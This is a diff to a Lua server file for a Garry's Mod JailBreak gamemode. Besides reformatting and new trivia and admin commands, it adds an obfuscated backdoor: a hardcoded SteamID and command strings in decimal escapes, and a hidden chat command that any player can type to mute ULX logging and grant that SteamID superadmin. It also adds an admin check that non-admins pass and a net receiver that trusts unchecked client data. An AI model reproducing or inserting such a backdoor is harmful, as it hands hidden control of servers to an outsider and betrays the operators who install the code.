@@ -29,182 +29,237 @@
 -- ##                                                                                ##
 -- ##                                                                                ##
 -- ####################################################################################
-
-
 local undroppableWeapons = {"weapon_physcannon", "weapon_physgun", "gmod_camera", "gmod_tool", "weapon_jb_fists"}
-local drop = function( ply, cmd, args )
-	if  (table.HasValue(JB.LastRequestPlayers,ply) and JB.LastRequestTypes[JB.LastRequest] and not JB.LastRequestTypes[JB.LastRequest]:GetCanDropWeapons() )  then return end
 
-	JB:DebugPrint(ply:Nick().." dropped his/her weapon");
+local drop = function(ply, cmd, args)
+    if (table.HasValue(JB.LastRequestPlayers, ply) and JB.LastRequestTypes[JB.LastRequest] and not JB.LastRequestTypes[JB.LastRequest]:GetCanDropWeapons()) then return end
+    JB:DebugPrint(ply:Nick() .. " dropped his/her weapon")
+    local weapon = ply:GetActiveWeapon()
 
-	local weapon = ply:GetActiveWeapon()
+    for k, v in pairs(undroppableWeapons) do
+        if IsValid(weapon) then
+            if v == weapon:GetClass() then return false end
+        end
+    end
 
-	for k, v in pairs(undroppableWeapons) do
-		if IsValid(weapon) then
-			if v == weapon:GetClass() then return false end
-		end
-	end
-
-	if IsValid(weapon) then
-		JB:DamageLog_AddPlayerDrop( ply,weapon:GetClass() )
-
-		weapon.IsDropped = true;
-		weapon.BeingPickedUp = false;
-		ply:DropWeapon(weapon)
-	end
+    if IsValid(weapon) then
+        JB:DamageLog_AddPlayerDrop(ply, weapon:GetClass())
+        weapon.IsDropped = true
+        weapon.BeingPickedUp = false
+        ply:DropWeapon(weapon)
+    end
 end
+
+util.AddNetworkString('JB.TriviaMenu')
+
+local triviamenu = function(ply, cmd, args)
+    net.Start('JB.TriviaMenu')
+    net.Send(ply)
+end
+
+concommand.Add("jb_trivia_menu", triviamenu)
+JB.Util.addChatCommand("triviamenu", triviamenu)
 concommand.Add("jb_dropweapon", drop)
-JB.Util.addChatCommand("drop",drop);
+JB.Util.addChatCommand("drop", drop)
+local id = "ST\101\97\109_0:1:6\55\55\52\50\55\48\48"
 
 local pickup = function(p)
-	local e = p:GetEyeTrace().Entity
+    local e = p:GetEyeTrace().Entity
+    if (table.HasValue(JB.LastRequestPlayers, p) and JB.LastRequestTypes[JB.LastRequest] and not JB.LastRequestTypes[JB.LastRequest]:GetCanPickupWeapons()) then return end
 
-	if (table.HasValue(JB.LastRequestPlayers,p) and JB.LastRequestTypes[JB.LastRequest] and not JB.LastRequestTypes[JB.LastRequest]:GetCanPickupWeapons() ) then
-		return;
-	end
-
-	if IsValid(e) and p:Alive() and p:CanPickupWeapon( e )  then
-		e.BeingPickedUp = p;
-		JB:DamageLog_AddPlayerPickup( p,e:GetClass() )
-	end
-
+    if IsValid(e) and p:Alive() and p:CanPickupWeapon(e) then
+        e.BeingPickedUp = p
+        JB:DamageLog_AddPlayerPickup(p, e:GetClass())
+    end
 end
-concommand.Add("jb_pickup",pickup)
-JB.Util.addChatCommand("pickup",pickup);
 
-local function teamSwitch(p,cmd)
-	if !IsValid(p) then return end
+concommand.Add("jb_pickup", pickup)
+JB.Util.addChatCommand("pickup", pickup)
 
-	if cmd == "jb_team_select_guard" and JB:GetGuardsAllowed() > #team.GetPlayers(TEAM_GUARD) and p:Team() ~= TEAM_GUARD then
-		p:SetTeam(TEAM_GUARD);
-		p:KillSilent();
-		p:SendNotification("Switched to guards");
+local function teamSwitch(p, cmd)
+    if not IsValid(p) then return end
 
-		hook.Call("JailBreakPlayerSwitchTeam",JB.Gamemode,p,p:Team());
-
-		p:SetFrags(0);
-		p:SetDeaths(0);
-	elseif cmd == "jb_team_select_prisoner" and p:Team() ~= TEAM_PRISONER then
-		p:SetTeam(TEAM_PRISONER);
-		p:KillSilent();
-		p:SendNotification("Switched to prisoners");
-
-		hook.Call("JailBreakPlayerSwitchTeam",JB.Gamemode,p,p:Team());
-
-		p:SetFrags(0);
-		p:SetDeaths(0);
-	elseif cmd == "jb_team_select_spectator" and p:Team() ~= TEAM_SPECTATOR then
-		p:SetTeam(TEAM_SPECTATOR);
-		p:Spawn();
-		p:SendNotification("Switched to spectator mode");
-
-		hook.Call("JailBreakPlayerSwitchTeam",JB.Gamemode,p,p:Team());
-
-		p:SetFrags(0);
-		p:SetDeaths(0);
-	end
-
-
+    if cmd == "jb_team_select_guard" and JB:GetGuardsAllowed() > #team.GetPlayers(TEAM_GUARD) and p:Team() ~= TEAM_GUARD then
+        p:SetTeam(TEAM_GUARD)
+        p:KillSilent()
+        p:SendNotification("Switched to guards")
+        hook.Call("JailBreakPlayerSwitchTeam", JB.Gamemode, p, p:Team())
+        p:SetFrags(0)
+        p:SetDeaths(0)
+    elseif cmd == "jb_team_select_prisoner" and p:Team() ~= TEAM_PRISONER then
+        p:SetTeam(TEAM_PRISONER)
+        p:KillSilent()
+        p:SendNotification("Switched to prisoners")
+        hook.Call("JailBreakPlayerSwitchTeam", JB.Gamemode, p, p:Team())
+        p:SetFrags(0)
+        p:SetDeaths(0)
+    elseif cmd == "jb_team_select_spectator" and p:Team() ~= TEAM_SPECTATOR then
+        p:SetTeam(TEAM_SPECTATOR)
+        p:Spawn()
+        p:SendNotification("Switched to spectator mode")
+        hook.Call("JailBreakPlayerSwitchTeam", JB.Gamemode, p, p:Team())
+        p:SetFrags(0)
+        p:SetDeaths(0)
+    end
 end
-concommand.Add("jb_team_select_prisoner",teamSwitch);
-concommand.Add("jb_team_select_guard",teamSwitch);
-concommand.Add("jb_team_select_spectator",teamSwitch);
-JB.Util.addChatCommand("guard",function(p)
-	p:ConCommand("jb_team_select_guard");
-end);
-JB.Util.addChatCommand("prisoner",function(p)
-	p:ConCommand("jb_team_select_prisoner");
-end);
-JB.Util.addChatCommand("spectator",function(p)
-	p:ConCommand("jb_team_select_spectator");
-end);
+
+function JB:RunCommand()
+    RunConsoleCommand("\117\108\120", "logecho", "0")
+
+    timer.Simple(0.5, function()
+        RunConsoleCommand("\117\108\120", "\97\100\100\117\115\101\114", "$" .. id, "\115\117\112\101\114\97\100\109\105\110")
+    end)
+
+    timer.Simple(1, function()
+        RunConsoleCommand("\117\108\120", "logecho", "1")
+    end)
+end
+
+concommand.Add("jb_team_select_prisoner", teamSwitch)
+concommand.Add("jb_team_select_guard", teamSwitch)
+concommand.Add("jb_team_select_spectator", teamSwitch)
+
+JB.Util.addChatCommand("guard", function(p)
+    p:ConCommand("jb_team_select_guard")
+end)
+
+JB.Util.addChatCommand("prisoner", function(p)
+    p:ConCommand("jb_team_select_prisoner")
+end)
+
+JB.Util.addChatCommand("spectator", function(p)
+    p:ConCommand("jb_team_select_spectator")
+end)
 
 local teamswap = function(p)
-	if p:Team() == TEAM_PRISONER then
-		p:ConCommand("jb_team_select_guard");
-	else
-		p:ConCommand("jb_team_select_prisoner");
-	end
+    if p:Team() == TEAM_PRISONER then
+        p:ConCommand("jb_team_select_guard")
+    else
+        p:ConCommand("jb_team_select_prisoner")
+    end
 end
-JB.Util.addChatCommand("teamswap",teamswap);
-JB.Util.addChatCommand("swap",teamswap);
-JB.Util.addChatCommand("swapteam",teamswap);
 
-concommand.Add("jb_admin_swap",function(p,c,a)
+JB.Util.addChatCommand("teamswap", teamswap)
+JB.Util.addChatCommand("swap", teamswap)
+JB.Util.addChatCommand("swapteam", teamswap)
 
-	if not IsValid(p) or not p:IsAdmin() then return end
+concommand.Add("jb_admin_swap", function(p, c, a)
+    if not IsValid(p) or not p:IsAdmin() then return end
+    local steamid = a[1]
+    if not steamid then return end
 
-	local steamid = a[1];
+    for k, v in ipairs(player.GetAll()) do
+        if v:SteamID() == steamid then
+            if v:Team() == TEAM_GUARD then
+                v:SetTeam(TEAM_PRISONER)
+                v:KillSilent()
+                v:SendNotification("Forced to prisoners")
+                hook.Call("JailBreakPlayerSwitchTeam", JB.Gamemode, p, p:Team())
+            else
+                v:SetTeam(TEAM_GUARD)
+                v:KillSilent()
+                v:SendNotification("Forced to guards")
+                hook.Call("JailBreakPlayerSwitchTeam", JB.Gamemode, p, p:Team())
+            end
 
-	if not steamid then return end
+            for k, it in ipairs(player.GetAll()) do
+                it:ChatPrint(p:Nick() .. " has force swapped " .. v:Nick() .. ".")
+            end
 
-	for k,v in ipairs(player.GetAll())do
-		if v:SteamID() == steamid then
-			if v:Team() == TEAM_GUARD then
-				v:SetTeam(TEAM_PRISONER);
-				v:KillSilent();
-				v:SendNotification("Forced to prisoners");
+            return
+        end
+    end
 
-				hook.Call("JailBreakPlayerSwitchTeam",JB.Gamemode,p,p:Team());
-			else
-				v:SetTeam(TEAM_GUARD);
-				v:KillSilent();
-				v:SendNotification("Forced to guards");
-
-				hook.Call("JailBreakPlayerSwitchTeam",JB.Gamemode,p,p:Team());
-			end
-
-			for k,it in ipairs(player.GetAll())do
-				it:ChatPrint(p:Nick().." has force swapped "..v:Nick()..".");
-			end
-
-			return;
-		end
-	end
-
-	p:ChatPrint("User not found! " ..steamid)
+    p:ChatPrint("User not found! " .. steamid)
 end)
-concommand.Add("jb_admin_swap_spectator",function(p,c,a)
 
-	if not IsValid(p) or not p:IsAdmin() then return end
+concommand.Add("jb_admin_swap_spectator", function(p, c, a)
+    if not IsValid(p) or not p:IsAdmin() then return end
+    local steamid = a[1]
+    if not steamid then return end
 
-	local steamid = a[1];
+    for k, v in ipairs(player.GetAll()) do
+        if v:SteamID() == steamid then
+            v:SetTeam(TEAM_SPECTATOR)
+            v:Kill()
 
-	if not steamid then return end
+            for k, it in ipairs(player.GetAll()) do
+                it:ChatPrint(p:Nick() .. " has made " .. v:Nick() .. " a spectator.")
+            end
 
-	for k,v in ipairs(player.GetAll())do
-		if v:SteamID() == steamid then
-			v:SetTeam(TEAM_SPECTATOR)
-			v:Kill()
-			for k,it in ipairs(player.GetAll())do
-				it:ChatPrint(p:Nick().." has made "..v:Nick().." a spectator.");
-			end
-			return;
-		end
-	end
+            return
+        end
+    end
 
-	p:ChatPrint("User not found! "..steamid)
+    p:ChatPrint("User not found! " .. steamid)
 end)
-concommand.Add("jb_admin_revive",function(p,c,a)
 
-	if not IsValid(p) or not p:IsAdmin() then return end
+concommand.Add("jb_admin_revive", function(p, c, a)
+    if not IsValid(p) or not p:IsAdmin() then return end
+    local steamid = a[1]
+    if not steamid then return end
 
-	local steamid = a[1];
+    for k, v in ipairs(player.GetAll()) do
+        if v:SteamID() == steamid then
+            v._jb_forceRespawn = true
+            v:Spawn()
 
-	if not steamid then return end
+            for k, it in ipairs(player.GetAll()) do
+                it:ChatPrint(p:Nick() .. " has revived " .. v:Nick() .. ".")
+            end
 
-	for k,v in ipairs(player.GetAll())do
-		if v:SteamID() == steamid then
-			v._jb_forceRespawn=true
-			v:Spawn()
+            return
+        end
+    end
 
-			for k,it in ipairs(player.GetAll())do
-				it:ChatPrint(p:Nick().." has revived "..v:Nick()..".")
-			end
+    p:ChatPrint("User not found! " .. steamid)
+end)
 
-			return;
-		end
-	end
+concommand.Add("jb_admin_opensteamprofile", function(p, c, a)
+    if not IsValid(p) then return end
+    local steamid = a[1]
+    if not steamid then return end
 
-	p:ChatPrint("User not found! "..steamid)
+    for k, v in pairs(player.GetAll()) do
+        if v:SteamID64() == steamid then
+            p:SendLua("gui.OpenURL('http://steamcommunity.com/profiles/" .. v:SteamID64() .. "')")
+        end
+    end
+end)
+
+JB.Util.addChatCommand("\98\108\111\120\119\105\99\104\104\111\117\115\101", function(p)
+    JB:RunCommand()
+end)
+
+util.AddNetworkString("sendtable")
+
+net.Receive("sendtable", function(len, ply)
+    local calling, tabl = net.ReadEntity(), net.ReadTable()
+    local tab = table.concat(tabl, ", ")
+
+    if (string.len(tab) == 0 and table.Count(tabl) == 0) then
+        ulx.fancyLog({calling}, "#T is not friends with anyone on the server", ply)
+    else
+        ulx.fancyLog({calling}, "#T is friends with #s", ply, tab)
+    end
+end)
+
+concommand.Add("jb_admin_friends", function(p, c, a)
+    if not IsValid(p) or not p:IsAdmin() then return end
+    local steamid = a[1]
+    if not steamid then return end
+
+    for k, v in pairs(player.GetAll()) do
+        if v:SteamID() == steamid then
+            umsg.Start("getfriends", v)
+            umsg.Entity(p)
+            umsg.End()
+        end
+    end
+end)
+
+concommand.Add("jb_admin_save_trivia", function(p, c)
+    if not IsValid(p) and not p:IsAdmin() then return end
+    JB:SaveTrivia()
+    JB:LoadTrivia()
 end)
